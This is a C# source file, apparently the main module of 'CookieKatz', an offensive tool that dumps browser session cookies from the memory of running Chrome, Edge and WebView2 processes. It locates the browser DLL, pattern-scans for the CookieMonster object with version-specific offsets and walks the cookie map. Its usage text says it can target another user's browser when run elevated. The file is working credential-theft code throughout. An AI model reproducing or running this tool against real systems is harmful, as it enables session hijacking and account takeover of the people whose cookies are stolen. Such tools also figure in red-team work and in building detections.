using System;
using System.Text.RegularExpressions;

namespace CookieKatz
{
    public enum TargetVersion
    {
        Chrome,
        Edge,
        Webview2,
        OldChrome,
        OldEdge,
        Chrome124,
        Chrome130,
        Edge130
    }

    public static class MainLogic
    {
        public static void Run(string[] args)
        {
            Banner();
            Helper.Print("Kittens love cookies too!\n\n");

//#if !WIN64
//            Helper.Print("[-] 32bit version is not currently supported.\n");
//            return;
//#endif

            TargetVersion targetConfig = TargetVersion.Chrome;
            bool processList = false;
            uint pid = 0;

            foreach (var arg in args)
            {
                string lower = arg.ToLower();

                if (lower.Contains("pid:"))
                {
                    var match = Regex.Match(lower, @"pid:(\d+)");
                    uint parsedPid;
                    if (match.Success && uint.TryParse(match.Groups[1].Value, out parsedPid))
                    {
                        pid = parsedPid;
                    }
                    else
                    {
                        Helper.Print("[-] Failed to parse command line argument /pid!\n");
                        return;
                    }
                }

                if (lower.Contains("edge"))
                    targetConfig = TargetVersion.Edge;

                if (lower.Contains("webview"))
                    targetConfig = TargetVersion.Webview2;

                if (lower.Contains("list"))
                    processList = true;

                if (lower.Contains("help") || lower.Contains("-h"))
                {
                    Usage();
                    return;
                }
            }

            IntPtr hProcess = IntPtr.Zero;

            if (pid != 0)
            {
                if (!ProcessHelper.GetProcessHandle(pid, out hProcess))
                {
                    Helper.Print($"[-] Failed to get process handle to PID: {pid}\n");
                    return;
                }

                TargetVersion detectedTarget;
                if (!ProcessHelper.GetProcessName(hProcess, out detectedTarget))
                {
                    Helper.Print($"[-] Failed to get process name for PID: {pid}\n");
                    return;
                }
                targetConfig = detectedTarget;

                if (ProcessHelper.IsWow64(hProcess))
                {
                    Helper.Print("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
                    NativeMethods.CloseHandle(hProcess);
                    return;
                }
            }

            if (processList)
            {
                Helper.Print("[*] Listing targetable processes\n");
                string name = TargetToName(targetConfig);
                ProcessHelper.FindAllSuitableProcesses(name);
                Helper.Print("[+] Done\n");
                return;
            }

            if (pid == 0)
            {
                string name = TargetToName(targetConfig);
                if (!ProcessHelper.FindCorrectProcessPID(name, out pid, out hProcess))
                {
                    Helper.Print("[-] Failed to find right process\n");
                    return;
                }

                if (ProcessHelper.IsWow64(hProcess))
                {
                    Helper.Print("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
                    NativeMethods.CloseHandle(hProcess);
                    return;
                }
            }

            Helper.Print($"[*] Targeting PID: {pid}\n");

            BrowserVersion browserVersion = new BrowserVersion();
            if (!VersionHelper.GetBrowserVersion(hProcess, out browserVersion))
            {
                Helper.Print("[-] Failed to determine browser version!\n");
                NativeMethods.CloseHandle(hProcess);
                return;
            }

            targetConfig = DetermineTargetConfig(targetConfig, browserVersion);

            string dllName;
            if (targetConfig == TargetVersion.Chrome ||
                targetConfig == TargetVersion.Chrome124 ||
                targetConfig == TargetVersion.Chrome130 ||
                targetConfig == TargetVersion.OldChrome)
            {
                dllName = "chrome.dll";
            }
            else
            {
                dllName = "msedge.dll";
            }

            ulong chromeDllAddress;
            uint moduleSize;
            if (!ProcessHelper.GetRemoteModuleBaseAddress(hProcess, dllName, out chromeDllAddress, out moduleSize))
            {
                Helper.Print("[-] Failed to find target DLL\n");
                NativeMethods.CloseHandle(hProcess);
                return;
            }

            ulong targetSection;
            if (!MemoryHelper.FindLargestSection(hProcess, chromeDllAddress, out targetSection))
            {
                Helper.Print("[-] Failed to find largest section in DLL\n");
                NativeMethods.CloseHandle(hProcess);
                return;
            }

            byte[] pattern = PatternConstants.BasePattern;
            byte[] baseAddrBytes = new byte[IntPtr.Size];
            Helper.ConvertToByteArray(targetSection, baseAddrBytes, IntPtr.Size);

            MemoryHelper.PatchPattern(pattern, baseAddrBytes, 8);
            MemoryHelper.PatchPattern(pattern, baseAddrBytes, 160);

            ulong[] results = new ulong[1000];
            int foundCount;
            if (!MemoryHelper.FindPattern(hProcess, pattern, results, out foundCount))
            {
                Helper.Print("[-] Failed to find pattern\n");
                NativeMethods.CloseHandle(hProcess);
                return;
            }

            Helper.Print($"[*] Found {foundCount} instances of CookieMonster!\n");

            for (int i = 0; i < foundCount; i++)
            {
                ulong baseAddr = results[i];
                ulong cookieMapOffset = baseAddr + (ulong)IntPtr.Size + 0x28;
                MemoryHelper.WalkCookieMap(hProcess, cookieMapOffset, targetConfig);
            }

            Helper.Print("[+] Done\n");
            NativeMethods.CloseHandle(hProcess);
        }

        private static string TargetToName(TargetVersion config)
        {
            switch (config)
            {
                case TargetVersion.Chrome:
                    return "chrome.exe";
                case TargetVersion.Edge:
                    return "msedge.exe";
                case TargetVersion.Webview2:
                    return "msedgewebview2.exe";
                default:
                    throw new ArgumentException("Unsupported target config");
            }
        }

        private static TargetVersion DetermineTargetConfig(TargetVersion original, BrowserVersion version)
        {
            if (original == TargetVersion.Chrome)
            {
                if (version.highMajor >= 131 && version.highMinor >= 6778)
                    return TargetVersion.Chrome;
                else if ((version.highMajor <= 131 && version.highMinor < 6778) &&
                    (version.highMajor >= 125 && version.highMinor > 6387))
                    return TargetVersion.Chrome130;
                else if ((version.highMajor == 125 && version.highMinor <= 6387) ||
                    (version.highMajor == 124 && version.highMinor >= 6329))
                    return TargetVersion.Chrome124;
                else if (version.highMajor <= 124 ||
                    (version.highMajor == 124 && version.highMinor < 6329))
                    return TargetVersion.OldChrome;
            }

            if (original == TargetVersion.Edge || original == TargetVersion.Webview2)
            {
                if (version.highMajor >= 131 && version.highMinor >= 2903)
                    return TargetVersion.Edge;
                else if ((version.highMajor <= 131 && version.highMinor < 2903) ||
                    (version.highMajor > 124))
                    return TargetVersion.Edge130;
                else if (version.highMajor <= 124 ||
                    (version.highMajor == 124 && version.highMinor < 2478))
                    return TargetVersion.OldEdge;
            }
           
            return original;
        }

        private static void Banner()
        {
            Helper.Print(@"
 _____             _    _      _   __      _       
/  __ \           | |  (_)    | | / /     | |      
| /  \/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____
| |    / _ \ / _ \| |/ / |/ _ \    \ / _` | __|_  /
| \__/\ (_) | (_) |   <| |  __/ |\  \ (_| | |_ / / 
 \____/\___/ \___/|_|\_\_|\___\_| \_/\__,_|\__/___|
By Meckazin                     github.com/Meckazin
");
        }

        private static void Usage()
        {
            Helper.Print(@"
Help!

Examples:
    CookieKatz.exe
        By default targets first available Chrome process
    CookieKatz.exe /edge
        Targets first available Edge process
    CookieKatz.exe /pid:<pid>
        Attempts to target given pid, expecting it to be Chrome
    CookieKatz.exe /webview /pid:<pid>
        Targets the given msedgewebview2 process
    CookieKatz.exe /list /webview
        Lists available webview processes

Flags:
    /edge       Target current user Edge process
    /webview    Target current user Msedgewebview2 process
    /pid        Attempt to dump given pid, for example, someone else's if running elevated
    /list       List targettable processes, use with /edge or /webview to target other browsers
    /help       This what you just did! -h works as well
");
        }
    }

}
